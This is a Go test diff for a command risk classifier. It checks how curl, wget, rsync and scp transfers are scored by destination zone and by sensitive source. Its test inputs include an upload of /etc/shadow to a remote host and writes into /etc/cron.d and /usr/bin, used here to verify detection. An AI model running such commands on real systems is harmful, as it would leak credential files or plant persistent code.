@@ -50,6 +50,15 @@ func classify(in ZoningInput, cmd string, args ...string) LocationResult {
 	return ClassifyDestinationZone(in, cmdNameSet(cmd), cmd, args)
 }
 
+func hasWriteOperand(ops []risktypes.OperandZone) bool {
+	for _, oz := range ops {
+		if oz.Role == risktypes.OperandRoleWrite {
+			return true
+		}
+	}
+	return false
+}
+
 // fakeFileInfo is a synthetic fs.FileInfo for injecting device/permission modes.
 type fakeFileInfo struct {
 	name string
@@ -558,6 +567,77 @@ func TestACLGrantsWrite_DefaultEntry(t *testing.T) {
 	assert.True(t, aclGrantsWrite("g:staff:rw"), "plain group-write ACL is a grant")
 	assert.False(t, aclGrantsWrite("default:g:staff:r-x"), "default group without write is not a grant")
 	assert.False(t, aclGrantsWrite("u:alice:rwx"), "a user ACL is not a group/other grant")
+}
+
+// --- data-transfer write destination (axis-2 contribution) ---
+
+func TestDataTransferWrite(t *testing.T) {
+	wd := zoningWorkdir(t)
+	in := zoningInput(wd, foreignIdent())
+
+	// curl/wget local write destination is zone-classified (egress Medium is added
+	// at the evaluator layer by the network profile, not here).
+	assert.Equal(t, runnertypes.RiskLevelLow,
+		classify(in, "curl", "http://x/y", "-o", filepath.Join(wd, "f")).Level)
+	assert.Equal(t, runnertypes.RiskLevelHigh,
+		classify(in, "curl", "-o", "/usr/bin/x", "http://x/y").Level)
+	assert.Equal(t, runnertypes.RiskLevelHigh,
+		classify(in, "wget", "-O", "/etc/cron.d/x", "http://x/y").Level)
+
+	// rsync to a remote daemon bare module: remote egress Medium. The remote
+	// destination contributes no local WRITE operand; the local source is recorded
+	// as a read operand (for sensitive-source detection and audit).
+	mod := classify(in, "rsync", filepath.Join(wd, "src"), "host::module")
+	assert.Equal(t, runnertypes.RiskLevelMedium, mod.Level)
+	assert.Contains(t, mod.ReasonCodes, risktypes.ReasonNetworkArgument)
+	assert.False(t, hasWriteOperand(mod.Operands), "a remote destination has no local write operand")
+
+	// rsync to a remote host:path is likewise remote egress.
+	assert.Equal(t, runnertypes.RiskLevelMedium,
+		classify(in, "rsync", filepath.Join(wd, "src"), "host:/remote/path").Level)
+
+	// The relative remote forms (host:file, host:, user@host:file) and bracketed
+	// IPv6 forms are also egress (rsync's positional rule: a colon before the first
+	// slash means remote; IPv6 hosts are bracketed).
+	for _, dest := range []string{
+		"host:file", "host:", "user@host:file",
+		"[::1]:file", "[2001:db8::1]:/path", "user@[::1]:file",
+	} {
+		r := classify(in, "rsync", filepath.Join(wd, "src"), dest)
+		assert.Equal(t, runnertypes.RiskLevelMedium, r.Level, "rsync to %q is remote egress", dest)
+		assert.False(t, hasWriteOperand(r.Operands), "remote dest %q has no local write operand", dest)
+	}
+
+	// scp -T is boolean (disable strict filename checking); it must not consume the
+	// following SRC, so a normal local-dest scp is still recognized and zoned.
+	scpT := classify(in, "scp", "-T", filepath.Join(wd, "src"), "/usr/bin/x")
+	assert.True(t, scpT.Recognized, "scp -T is boolean and must not shift operands")
+	assert.Equal(t, runnertypes.RiskLevelHigh, scpT.Level, "scp into a trust-critical dest is High")
+
+	// A sensitive local source uploaded to a remote destination is Medium and the
+	// source is recorded (the local-source extraction closes the audit/zoning gap).
+	up := classify(in, "rsync", "/etc/shadow", "host::module")
+	assert.Equal(t, runnertypes.RiskLevelMedium, up.Level)
+	assert.Contains(t, up.ReasonCodes, risktypes.ReasonSensitiveSourceCopy)
+
+	// A sensitive local source copied locally into a safe-zone is Medium (parity
+	// with cp), not Low: the source must be extracted and floored.
+	assert.Equal(t, runnertypes.RiskLevelMedium,
+		classify(in, "rsync", "/etc/shadow", filepath.Join(wd, "dst")).Level,
+		"rsync of a sensitive source into a safe-zone is Medium, like cp")
+
+	// A curl upload of a sensitive local file is flagged as a sensitive source.
+	upload := classify(in, "curl", "-T", "/etc/shadow", "http://host/up")
+	assert.Contains(t, upload.ReasonCodes, risktypes.ReasonSensitiveSourceCopy,
+		"curl -T of a sensitive file is a sensitive-source upload")
+
+	// Purely local rsync into a safe-zone is not over-classified.
+	assert.Equal(t, runnertypes.RiskLevelLow,
+		classify(in, "rsync", filepath.Join(wd, "a"), filepath.Join(wd, "b")).Level)
+
+	// Local rsync into a trust-critical destination is High.
+	assert.Equal(t, runnertypes.RiskLevelHigh,
+		classify(in, "rsync", filepath.Join(wd, "a"), "/usr/bin/x").Level)
 }
 
 // --- carrier empty vs applied-but-unresolved ---
